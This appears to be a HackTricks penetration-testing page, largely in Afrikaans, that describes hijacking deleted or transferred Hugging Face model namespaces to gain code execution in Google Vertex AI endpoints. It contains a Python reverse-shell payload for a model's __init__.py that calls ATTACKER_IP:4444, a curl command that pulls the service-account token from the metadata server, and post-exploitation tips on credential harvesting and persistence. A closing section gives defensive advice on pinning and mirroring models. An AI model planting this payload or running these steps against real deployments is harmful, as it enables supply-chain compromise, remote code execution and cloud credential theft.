# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Senario

- Vertex AI Model Garden maak die direkte ontplooiing van baie Hugging Face (HF) models moontlik.
- HF model identifiers are Author/ModelName. As 'n author/org op HF verwyder word, kan dieselfde author-naam deur enigiemand weer geregistreer word. Attackers kan dan 'n repo met dieselfde ModelName op die legacy path skep.
- Pipelines, SDKs, or cloud catalogs wat slegs per naam haal (no pinning/integrity) sal die attacker-controlled repo trek. Wanneer die model ontplooi word, kan loader code vanaf daardie repo binne die Vertex AI endpoint-container uitgevoer word, wat RCE met die endpoint se permissies oplewer.

Twee algemene takeover-gevalle op HF:
- Ownership deletion: Ou pad 404 totdat iemand die author weer registreer en dieselfde ModelName publiseer.
- Ownership transfer: HF issue 307 redirects vanaf die ou Author/ModelName na die nuwe author. As die ou author later verwyder en deur 'n attacker herregistreer word, word die redirect-ketting gebreek en die attacker se repo bedien by die legacy path.

## Identifisering van herbruikbare namespaces (HF)

- Ou author verwyder: die bladsy vir die author gee 404 terug; die model pad mag 404 teruggee totdat takeover.
- Transferred models: die ou model pad issue 307 na die nuwe owner terwyl die ou author bestaan. As die ou author later verwyder en weer geregistreer word, sal die legacy path na die attacker se repo oplos.

Vinnige kontroles met curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-end aanvalsvloei teen Vertex AI

1) Ontdek herbruikbare model namespaces wat Model Garden as deployable gelys:
- Vind HF-modelle in Vertex AI Model Garden wat steeds as “verified deployable” vertoon.
- Verifieer op HF of die oorspronklike author uitgevee is, of die model oorgedra is en die ou author later verwyder is.

2) Herregistreer die uitgevee author op HF en skep dieselfde ModelName weer.

3) Publiseer 'n kwaadwillige repo. Sluit kode in wat by die model se laai uitgevoer word. Voorbeelde wat algemeen tydens HF model load uitgevoer word:
- Side effects in __init__.py of the repo
- Aangepaste modeling_*.py of processing code wat deur config/auto_map verwys word
- Kodepade wat trust_remote_code=True in Transformers pipelines vereis

4) 'n Vertex AI deployment van die legacy Author/ModelName trek nou die attacker repo. Die loader word binne die Vertex AI endpoint container uitgevoer.

5) Die payload vestig toegang vanaf die endpoint-omgewing (RCE) met die endpoint se permissies.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Aantekeninge
- In die werklike lewe verskil loaders. Baie Vertex AI HF integrations kloon en importeer repo modules wat in die model se config verwys word (bv. auto_map), wat code execution kan trigger. Sommige gebruiksgevalle vereis trust_remote_code=True.
- Die endpoint hardloop tipies in ’n toegewyde container met beperkte omvang, maar dit is ’n geldige aanvanklike foothold vir data-toegang en laterale beweging in GCP.

## Post-Exploitation Wenke (Vertex AI Endpoint)

Sodra code binne die endpoint container loop, oorweeg:
- Enumereer environment variables en metadata vir credentials/tokens
- Toegang tot aangehegte storage of mounted model artifacts
- Interageer met Google APIs via service account identity (Document AI, Storage, Pub/Sub, etc.)
- Persistensie in die model artifact indien die platform die repo weer herlaai

Enumereer instance metadata indien toeganklik (container-afhanklik):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Verdedigende riglyne vir Vertex AI-gebruikers

- Pin modelle per commit in HF loaders om stille vervanging te voorkom:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Spieël geverifieerde HF-modelle na 'n betroubare interne artefakstoor/registrasie en ontplooi van daar.
- Skandeer voortdurend codebases en configs vir hard-gekodeerde Author/ModelName wat verwyder of oorgedra is; werk na nuwe namespaces of pin per commit.
- In Model Garden, verifieer modelherkoms en die bestaan van die skrywer voordat ontplooiing plaasvind.

## Herkenningsheuristieke (HTTP)

- Verwyderde skrywer: skrywersbladsy 404; erfenis modelpad 404 tot oorname.
- Oorgedra model: erfenispad 307 na nuwe skrywer terwyl die ou skrywer nog bestaan; as die ou skrywer later verwyder en weer geregistreer word, dien die erfenispad aanvallerinhoud.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Kruisverwysings

- Sien breër metodologie- en voorsieningskettingnotas:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Verwysings

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
